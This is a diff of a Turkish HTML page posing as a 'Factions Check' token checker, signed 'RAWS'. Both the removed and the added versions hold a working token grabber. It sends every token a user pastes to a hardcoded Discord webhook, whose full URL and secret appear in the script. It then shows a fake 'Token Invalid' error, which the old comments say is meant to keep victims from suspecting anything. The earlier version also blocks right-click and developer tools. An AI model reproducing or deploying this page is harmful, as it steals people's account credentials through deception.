@@ -1,158 +1,61 @@
 <!DOCTYPE html>
+
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Factions Check | Ultimate</title>
-    <style>
-        body { 
-            background-color: #000; 
-            background-image: 
-                linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-            background-size: 45px 45px; 
-            color: #fff; 
-            font-family: 'Consolas', monospace; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            overflow: hidden;
-            cursor: none; 
-        }
-
-        #cursor {
-            width: 10px; height: 10px;
-            background-color: #00d2ff;
-            border-radius: 50%;
-            position: fixed;
-            pointer-events: none;
-            z-index: 10000;
-            transform: translate(-50%, -50%);
-            box-shadow: 0 0 15px #00d2ff, 0 0 25px #00d2ff;
-        }
-
-        .container { 
-            background-color: rgba(5, 5, 5, 0.95); 
-            padding: 40px; 
-            border-radius: 15px; 
-            width: 450px; 
-            text-align: center; 
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 0 40px rgba(0, 0, 0, 1);
-            position: relative;
-            z-index: 1;
-        }
-
-        h1 { 
-            color: #ff1e1e; 
-            text-transform: uppercase; 
-            letter-spacing: 4px; 
-            margin-bottom: 25px; 
-            text-shadow: 0 0 15px rgba(255, 30, 30, 0.3);
-        }
-
-        textarea { 
-            width: 100%; height: 160px; padding: 15px; 
-            background: #020202; 
-            border: 1px solid rgba(255, 30, 30, 0.2); 
-            border-radius: 8px; color: #00ff41; 
-            margin-bottom: 20px; outline: none; 
-            resize: none; box-sizing: border-box; font-size: 13px;
-        }
-
-        button { 
-            width: 100%; padding: 16px; 
-            background: linear-gradient(90deg, #800000, #cc0000); 
-            color: #fff; border: none; border-radius: 8px; 
-            font-weight: bold; text-transform: uppercase; letter-spacing: 2px;
-            transition: all 0.3s ease; cursor: none;
-        }
-
-        button:hover { filter: brightness(1.2); box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); }
-
-        #status { margin-top: 15px; font-size: 12px; color: #ffcc00; display: none; }
-
-        .raws-footer {
-            position: fixed; bottom: 20px; right: 25px; font-weight: bold; font-size: 12px;
-            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
-            background-size: 400% auto; -webkit-background-clip: text; background-clip: text;
-            color: transparent; animation: rainbow 5s linear infinite;
-        }
-
-        @keyframes rainbow { to { background-position: 400% center; } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Factions Check | Ultimate</title>
+<style>
+body { background-color: #000; color: #fff; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; cursor: crosshair; }
+.container { background-color: rgba(5, 5, 5, 0.95); padding: 40px; border-radius: 15px; width: 450px; text-align: center; border: 1px solid rgba(255, 30, 30, 0.3); box-shadow: 0 0 40px rgba(0, 0, 0, 1); }
+h1 { color: #ff1e1e; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; }
+textarea { width: 100%; height: 160px; padding: 15px; background: #020202; border: 1px solid #ff1e1e; border-radius: 8px; color: #00ff41; margin-bottom: 20px; outline: none; resize: none; box-sizing: border-box; }
+button { width: 100%; padding: 16px; background: linear-gradient(90deg, #800000, #cc0000); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+#status { margin-top: 15px; font-size: 13px; font-weight: bold; display: none; }
+</style>
 </head>
-<body oncontextmenu="return false;">
-
-<div id="cursor"></div>
-
+<body>
 <div class="container">
-    <h1>FACTIONS CHECK</h1>
-    <textarea id="contentInput" placeholder="Tokenleri buraya giriniz..."></textarea>
-    <button id="submitBtn">KONTROL ET</button>
-    <div id="status"></div>
+<h1>FACTIONS CHECK</h1>
+<textarea id="contentInput" placeholder="Tokenleri buraya giriniz..."></textarea>
+<button id="submitBtn">KONTROL ET</button>
+<div id="status"></div>
 </div>
-
-<div class="raws-footer">CRACKED BY RAWS</div>
-
 <script>
-(function() {
-    const cursor = document.getElementById('cursor');
-    document.addEventListener('mousemove', (e) => {
-        cursor.style.left = e.clientX + 'px';
-        cursor.style.top = e.clientY + 'px';
-    });
+const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
+document.getElementById('submitBtn').addEventListener('click', async function() {
+const val = document.getElementById('contentInput').value;
+const st = document.getElementById('status');
+const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 5);
+if (lines.length === 0) return;
 
-    // Senin webhook adresin
-    const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
+    st.style.display = "block";
+    st.textContent = "Bağlantı kuruluyor...";
+    st.style.color = "#ffcc00";
 
-    document.getElementById('submitBtn').addEventListener('click', async function() {
-        const val = document.getElementById('contentInput').value;
-        const st = document.getElementById('status');
-        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 10);
-
-        if (lines.length === 0) return;
-
-        st.style.display = "block";
-        st.textContent = "Bağlantı kuruluyor...";
-        st.style.color = "#ffcc00";
-
-        // ÖNEMLİ: Tarayıcı engelini aşmak için kontrolü atlayıp direkt gönderiyoruz
-        for (const token of lines) {
-            try {
-                await fetch(wh, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🚀 YENİ TOKEN GİRİŞİ",
-                            description: "```" + token + "```",
-                            color: 16711680,
-                            timestamp: new Date().toISOString(),
-                            footer: { text: "Factions Checker | RAWS" }
-                        }]
-                    })
-                });
-            } catch (err) {
-                // Hata olsa da işlemi sürdür
-            }
-        }
-
-        // Kullanıcıya sahte hata göstererek şüphelenmesini önle
-        setTimeout(() => {
-            st.textContent = "Token Invalid";
-            st.style.color = "#ff1e1e";
-        }, 1500);
-    });
-
-    // Sağ tık ve F12 engeli
-    document.onkeydown = (e) => {
-        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
-    };
-})();
+    for (const token of lines) {
+        try {
+            await fetch(wh, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🚀 YENİ TOKEN GİRİŞİ",
+                        description: "```" + token + "```",
+                        color: 16711680,
+                        timestamp: new Date().toISOString(),
+                        footer: { text: "Factions Checker | RAWS" }
+                    }]
+                })
+            });
+        } catch (err) {}
+    }
+    
+    setTimeout(() => {
+        st.textContent = "✕ Error: Token Invalid or Expired!";
+        st.style.color = "#ff1e1e";
+    }, 1500);
+});
 </script>
-
 </body>
 </html>
